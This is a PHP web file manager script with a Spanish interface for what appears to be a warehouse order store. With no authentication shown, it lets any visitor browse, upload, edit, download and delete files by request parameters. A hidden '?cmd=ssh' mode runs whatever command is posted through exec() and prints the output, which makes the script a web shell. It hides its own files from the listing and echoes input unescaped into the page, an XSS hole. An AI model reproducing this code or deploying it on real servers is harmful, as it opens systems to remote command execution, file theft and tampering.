<?php
ob_start();
session_start();
function __autoload($class_name) { require_once $class_name . '.Class.php';}
// PHP File Browser, v 1.1 beta 2009/09/09 12:40:20 dries Exp $
// Author, sudhir vishwakarma
/**
 * @file
 * The File Browser system, which controls the file     Manupulation.
 * 
 * License 
 * GNU General Public License version 3 (GPLv3) 
 *  
    File Browser (C) 2009  sudhir vishwakarma
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
    Also add information on how to contact you by electronic and paper mail.

    If the program does terminal interaction, make it output a short notice like this when it starts in an interactive mode:

    File Browser (C) 2009  sudhir vishwakarma

    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
    This is free software, and you are welcome to redistribute it
    under certain conditions; type `show c' for details.
    The hypothetical commands `show w' and `show c' should show the appropriate parts of the General Public License. Of course, your program's commands might be different; for a GUI interface, you would use an �about box�.

    You should also get your employer (if you work as a programmer) or school, if any, to sign a �copyright disclaimer� for the program, if necessary. For more information on this, and how to apply and follow the GNU GPL, see <http://www.gnu.org/licenses/>.

    The GNU General Public License does not permit incorporating your program into proprietary programs. If your program is a subroutine library, you may consider it more useful to permit linking proprietary applications with the library. If this is what you want to do, use the GNU Lesser General Public License instead of this License. But first, please read <http://www.gnu.org/philosophy/why-not-lgpl.html>.

 */
$oadbrowser = new adbrowser(true);

$dir = trim($_REQUEST['dir']);
$sEdit = trim($_REQUEST['edit']);
$sExtract = trim($_REQUEST['extract']);
$sViewFile = trim($_REQUEST['view']);

//      echo "Directorio antes de convertir: $dir";


if (!$dir) {
    $dir    = getcwd().$oadbrowser->separator;
}else{
    $dir = trim($_REQUEST['dir']).$oadbrowser->separator;
}

$dir = str_replace($oadbrowser->separator.$oadbrowser->separator, $oadbrowser->separator, $dir);

if ($_POST['button'] == "Borrar Archivos Seleccionados") {
//  echo "Directorio convertido: $dir";
    $aFiles = $_POST['chkfiles'];
    $oadbrowser->deleteFiles($aFiles);
}

if ($_POST['button'] == "Create File") {
    $sCreatefile = trim($_POST['createfile']);
    $oadbrowser->createFile($dir, $sCreatefile);
}
if ($_POST['button'] == "Create Directory") {
    $oadbrowser->createDirectory($dir, trim($_POST['createfile']));
}
$sDownloadFile = trim($_REQUEST['dwl']);
if ($sDownloadFile) {
    $oadbrowser->downloadFile($sDownloadFile);
    exit;
}
if ($sExtract != "") {
    $oadbrowser->extract($sExtract);
}
if ($_POST['button'] == 'SAVEFILE') {
    $bBackup = trim($_POST['Write_backup']);
    $sFileData = trim($_POST['editfile']);
    $oadbrowser->fileWriter($sEdit, $sFileData, $bBackup);
}
$sFileName = $_FILES['myfile']['name'];
if ($sFileName) {
    $oadbrowser->uploadFile($dir, $sFileName);   
}
if ($sViewFile) {
    $oadbrowser->viewFile($sViewFile);
    exit;
}
$sFiles = scandir(urldecode($dir));

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
        <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
        <meta name="robots" content="noindex">
        <meta http-equiv="expires" content="0">
        <meta http-equiv="pragma" content="no-cache">
        <style type="text/css">
        body {font-family:sans-serif; font-size: 10pt; color: #000000;}
    input {background-color: #efefef; color: #000000;}
        .border {margin: 1px; background-color:#ffffff; padding: 1em; border:1px solid #000000;}
    a {text-decoration:none; }
    a:hover { color : red; text-decoration : underline; }
    table.filelisting {background-color:#000000; width:100%; border:0px none #ffffff;}
        th {background-color:#f1f1f1;}
    td{background-color:#ffffff;padding-left:5px;font-family:sans-serif; font-size: 9pt; color: #000000;}
    .message{border: 1px solid #ffaaaa;background-color: #acffaa;padding:3px 3px 3px 5px;font-size: 9pt;color:#000;text-align:center;}
    .error{border: 1px solid #acffaa;background-color: #ffaaaa;padding:3px 3px 3px 5px;font-size: 10pt;color:#000;text-align:center;}
        </style>
        <script type="text/javascript">
    function filter (begriff) {
        var suche = begriff.value.toLowerCase();
        var table = document.getElementById("filetable");
        var ele;
        for(var r = 1; r < table.rows.length; r++) {
            ele = table.rows[r].cells[1].innerHTML.replace(/<[^>]+>/g,"");
            if(ele.toLowerCase().indexOf(suche)>=0 )
                table.rows[r].style.display = '';
            else table.rows[r].style.display = 'none';
        }
    }
    function selectAll(obj) {
        var oFileList = obj.elements['chkfiles[]'];
        for(i=0; i < oFileList.length; ++i) {
            if(obj.selall.checked == true)
                oFileList[i].checked = true;
            else
                oFileList[i].checked = false;
        }
    }
        </script>
        <title>PHP File Browser V. 1.1</title>
</head>
<body>
<?php
if ($oadbrowser->sError) {
//    echo "<p class=\"error\">".$oBrowser->sError."</p>";
?>
        <script language="javascript">
                window.alert("<?php echo "".$oadbrowser->sError.""; ?>");
        </script>
<?php
}
if ($oadbrowser->sMessage) {
//    echo "<p class=\"message\">".$oBrowser->sMessage."</p>";
?>
        <script language="javascript">
                window.alert("<?php echo "".$oadbrowser->sMessage.""; ?>");
        </script>
<?php
}
?>
<?php
if ($_GET['cmd'] == 'ssh') {
    $sSsh_command = trim($_POST['ssh_command']);
    if ($sSsh_command) {
        $aResult = array();
        exec($sSsh_command, $aResult);
    }
?>
<div>
        <div>
                <form name="frmSsh" method="post">
                        Command: <input type="text" value="<?php echo stripslashes($_POST['ssh'])?>" name="ssh_command"  size="70"><input type="submit" value="GO"/>
                </form>
        </div>
                <br/>
                <div>
                <?php
                         if (is_array($aResult)) {
                 foreach ($aResult as $resultVal){
                     echo $resultVal."<br/>";
                 }
             }
                                ?>
                </div>
</div>
<?php
}
elseif($sEdit != "") {
    $oadbrowser->readContent($sEdit, $contents);
?>
<div>
        <div class="border">
                <form name="frmedit" method="post">
                        <p>
                        <strong>File Name: <?php echo basename($sEdit)?></strong>
                        </p>
                        <textarea name="editfile" style="height:400px;width:100%"><?php echo htmlentities($contents)?></textarea>
                        <p>
                        <input type="text" name="button" value="SAVEFILE" style="display:none"/>
                        <input type="checkbox" name="Write_backup" value="1" id="Write_backup" title="Write backup"/>
                        <label for="Write_backup">
                        <strong>Write backup</strong>
                        </label>
                        <br/>
                        </p>
                        <p>
                        <input type="submit" value="SAVE"/>
                        </p>
                </form>
        </div>
</div>
<?php }else{?>
<div>
  <form action="adbrowser.php" method="Post" name="filelist" class="border">
    <table width="100%" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td>Filtrar por nombre de archivo:
        <input name="filt" onKeypress="event.cancelBubble=true;" onkeyup="filter(this)" type="text"></td>
        <td align="right"><input title="Delete selected files and directories."  type="Submit" onClick="return confirm('&iquest;Estas seguro de querer borrar estos Pedidos?');" name="button" value="Borrar Archivos Seleccionados"></td>
      </tr>
    </table>
                Alamacen Actual: CEDIS <?php // echo $oBrowser->getCurrentDir($dir); ?><br />
                <br />
<table id="filetable" border="0" cellpadding="0px" cellspacing="1px" width="100%" class="filelisting">
                        <tr >
                                <th></th>
                                <th>Archivo</th>
                                <th>Tama&ntilde;o</th>
                                <th>Tipo</th>
                                <th>Fecha</th>
                          <th>&nbsp;</th>
                                
                        </tr>
                <?php
             if (is_array($sFiles)) {
                 foreach ($sFiles as $file){
                                        if ($file != "." && $file != ".." && $file != "dir1" && $file != "index.php.old" && $file != "browser.php" && $file != "Browser.Class.php" && $file != "adbrowser.Class.php" && $file != "adbrowser.php" && $file != "_notes") {                         ?>
    
                        <tr >
                                <td>
                                        <?php if ($file != "." && $file != "..") {?><input type="checkbox" id="chkfiles[]" name="chkfiles[]" value="<?php echo $file?>"/><?php } ?>                             </td>
                                <td><?php echo $oadbrowser->fileName($file, $dir);?></td>
                                <td><?php echo $oadbrowser->showFileSize($file, $dir);?></td>
                                <td><?php echo substr(strrchr($dir.$file,'.'),1);?></td>
                                <td><?php $aFileInfo = stat($dir.$file); echo $oadbrowser->dateFormat($aFileInfo['atime'])?></td>
                          <td><?php echo $oadbrowser->showDownload($file, $dir);?></td>
                        </tr>
                <?php } } } ?>
            
                        <tr >
                                <td colspan="7">
                                        <!-- <input type="checkbox" id="selall" name="selall" onClick="selectAll(this.form)"> -->
<!--                                    <label for="selall">
                                        Selecccionar todos los archivos                                 </label> -->                           </td>
                        </tr>
        </table>
                <br/>
                <table width="100%" border="0" cellspacing="0" cellpadding="0">
          <tr>
            <td align="right"><input title="Delete selected files and directories."  type="Submit" onClick="return confirm('�Estas seguro de querer borrar estos Pedidos?');" name="button" value="Borrar Archivos Seleccionados"></td>
          </tr>
        </table>
            <p><!--input title="Download selected files and directories as one zip file"  id="but_Zip" type="Submit" name="Submit" value="Download selected files as zip"-->
        </form>
</div>
<?php }?>
</body>
</html>

